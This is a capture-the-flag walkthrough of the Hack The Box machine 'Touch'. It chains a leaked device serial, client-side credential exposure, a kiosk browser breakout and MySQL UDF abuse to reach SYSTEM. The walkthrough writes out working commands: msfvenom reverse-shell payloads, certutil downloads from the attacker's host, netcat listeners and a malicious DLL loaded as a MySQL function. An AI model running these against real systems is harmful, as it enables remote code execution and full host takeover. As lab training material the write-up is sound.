
# Touch - Hack The Box Walkthrough

> **Platform:** Hack The Box
> 
> **Machine:** Touch
> 
> **Difficulty:** Easy
>
> **Category:** Windows
> 
> **Techniques:** Web enumeration, unauthenticated API disclosure, weak/default authentication, client-side credential leakage, RDP, kiosk lockdown breakout via browser file execution, hardcoded database credentials, MySQL UDF privilege escalation
## Attack Path

Booking code (from Layover) 
↓ 
DeviceHub API leaks device serial 
↓ 
DeviceHub admin login (serial used as default password) 
↓ 
Staff credentials exposed in dashboard client-side JS 
↓
RDP into locked-down kiosk 
↓ 
Kiosk breakout via browser file execution 
↓ 
Shell as KioskUser, user flag 
↓ 
Plaintext MySQL root credentials in ProgramData 
↓ 
MySQL UDF abuse (service runs as LocalSystem) → SYSTEM, root flag

### 1. Initial Enumeration

```
135/tcp  open  msrpc          Microsoft Windows RPC
3389/tcp open  ms-wbt-server  Microsoft Terminal Service
5985/tcp open  http           Microsoft HTTPAPI httpd 2.0 (WinRM)
8443/tcp open  http           Microsoft HTTPAPI httpd 2.0
```

No 88/389, so a standalone host, not a DC. Browsing 8443 over https:// fails (SSL_ERROR_RX_RECORD_TOO_LONG) — it's plain HTTP despite the port number. Loads a "Nexion DeviceHub" login page, DH-100 — Gate B7.

HTB's machine page carries over a name/code from Layover:

Username: Jenny Crawford Password: KS7X2M

### 2. The Nexion DeviceHub Management Portal

```
feroxbuster -u http://10.129.78.128:8443/ -k
```

```
403   GET        5l       29w      312c  /api
200   GET       14l       42w      398c  /api/status
405   GET        5l       29w      313c  /api/scan
```

/api/status is unauthenticated:

```
curl http://10.129.78.128:8443/api/status
```

```
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042",
"firmware":"1.4.2","status":"online","uptime":67184}
```

The login page hints the default password is the device serial — already leaked above.

```
curl -k http://10.129.78.128:8443/login -X POST -d "password=NX-DH-2024-B7042" -i
```

```
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: nxsession=...
```

Logged in.

### 3. Credentials Leaked in Client-Side JavaScript

The dashboard shows two peripherals (DocReader scanner, TP-820 printer) with masked credentials and a "show" toggle. Source shows the values are already in the HTML, just hidden by JS:

```
onclick="toggleCred('dsp1','K!0sk2026#')"
```

Username: KioskUser Password: K!0sk2026#

Failed against WinRM — RDP-only.

### 4. Initial Access — RDP into the Kiosk

```
xfreerdp /v:10.129.78.128 /u:KioskUser /p:'K!0sk2026#' /cert:ignore
```

Drops into a locked-down fullscreen kiosk (HTB Airways check-in + Nexion DocReader scanner app), no desktop or taskbar.

### 5. Kiosk Breakout

Powered off the DocReader/printer services from the DeviceHub panel:

```
curl -k -b cookies.txt -X POST http://10.129.78.128:8443/api/scanner/power \
  -H "Content-Type: application/json" -d '{"powered":false}'
```

Back in the kiosk, the document-scan step now fails against the dead service and throws an error dialog with a support link. Clicking it opens a real browser. Navigating to:

```
file:///C:/Windows/System32/cmd.exe
```

triggers a file download rather than navigation; opening it spawns cmd.exe as KioskUser, fully outside the kiosk.

### 6. Stabilizing the Shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.112 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 80
nc -lvnp 4444
```

On target:

```
certutil -urlcache -split -f http://10.10.15.112/shell.exe shell.exe
shell.exe
```

### 7. User Flag

```
type C:\Users\KioskUser\Desktop\user.txt
```

### 8. Privilege Enumeration

```
whoami /groups
```

→ KIOSK-042\Printer Administrators (custom group, noted)

```
whoami /priv
```

→ nothing exploitable (no SeImpersonate/SeLoadDriver)

```
netstat -ano | findstr LISTENING
```

```
127.0.0.1:3001  — kiosk Node frontend
127.0.0.1:3306  — MySQL
```

```
sc qc MySQL80
```

→ SERVICE_START_NAME : LocalSystem

```
icacls "C:\MySQL\bin"
```

→ NT AUTHORITY\Authenticated Users:(I)(M)

Service can't be stopped/started as KioskUser, so MySQL needs to load malicious code while running rather than a binary swap.

### 9. Hunting MySQL Credentials

Program Files locations for HTB Airways / Nexion DocReader: nothing useful.

C:\ProgramData\HTB Airways:

```
db-config.ini        (Access Denied)
db-sync-replica.ps1   (Access Denied)
refresh-dates.bat     (readable)
refresh-dates.sql
```

```
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

```
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

Username: root Password: HTB@irw4ys_DB!2026

### 10. Privilege Escalation — MySQL UDF Abuse

MySQL 8.0, LocalSystem, root creds in hand, writable plugin dir:

```
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SHOW VARIABLES LIKE 'plugin_dir';"
```

→ C:\MySQL\lib\plugin\

```
icacls "C:\MySQL\lib\plugin"
```

→ NT AUTHORITY\Authenticated Users:(I)(M)

MySQL 8 doesn't ship sys_exec by default, so build a reverse-shell DLL (fires on load, no separate call needed):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.112 LPORT=5555 -f dll -o evil.dll
certutil -urlcache -split -f http://10.10.15.112/evil.dll C:\MySQL\lib\plugin\evil.dll
nc -lvnp 5555
```

```
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'evil.dll';"
```

Listener catches:

```
NT AUTHORITY\SYSTEM
```

### 11. Root Flag

```
whoami
nt authority\system

type C:\Users\Administrator\Desktop\root.txt
```

### 12. Conclusion

A chain of small trust failures: DeviceHub trusts its own serial as a default password and leaks that serial unauthenticated; the dashboard trusts the browser to hide staff creds instead of protecting them server-side; the kiosk trusts its backend to stay alive and hands over a real browser (and shell) the moment it doesn't; a world-readable script leaks DB root creds; and a LocalSystem MySQL service with a writable plugin dir turns that into SYSTEM.

### Key Takeaways

Never derive a default password from enumerable device data like a serial number. An admin panel that also stores staff credentials for other systems is a single point of compromise. Kiosk lockdowns need to block file:// navigation and download/open behavior — an unrestricted browser is an unrestricted shell. Never hardcode plaintext credentials in scheduled-task scripts, especially in world-readable paths like C:\ProgramData. A LocalSystem database service with a writable plugin directory is a direct path to SYSTEM for any account that can authenticate to it.
